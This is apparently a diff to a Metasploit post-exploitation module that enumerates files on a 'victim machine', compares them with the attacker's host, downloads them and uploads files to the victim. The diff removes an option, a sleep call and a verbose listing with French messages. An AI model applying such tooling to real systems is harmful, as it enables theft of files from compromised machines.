@@ -51,7 +51,6 @@ class MetasploitModule < Msf::Post
         OptString.new('FILE_NAME', [false, 'search a specific file. If this option is enabled, it will just try to find this file.', '']),
         OptString.new('LOCATION_TO_SEND', [false, 'Location where file will be uploaded on victim machine', '']),
         OptPath.new('FILE_TO_UPLOAD', [false, 'file to upload on victim machine', '']),
-        OptPath.new('LOCATION_TO_RECEIVE', [false, 'location where file will be received on host machine', ''])
       ]
     )
   end
@@ -237,7 +236,6 @@ end
         index += 1 if index < files.length-1
       when SELECT_SAVE_FILE
         download_file(files[index])
-        sleep(10)
       when ""
         return
       end
@@ -256,19 +254,6 @@ def run
     victim_files = enumerate_files_with_extension_victim()
 
     host_files = enumerate_files_with_extension_host()
-
-    if datastore['VERBOSE'] == true then
-      print_good("liste des fichiers de la victime : ")
-      victim_files[0].each do |file|
-          print_status(file)
-      end
-
-      print_good("liste des fichiers de l'attaquant : ")
-      host_files.each do |file|
-          print_status(file)
-      end
-    end
-
 
 
     if compare_files_list(victim_files[0], host_files).empty? == true then
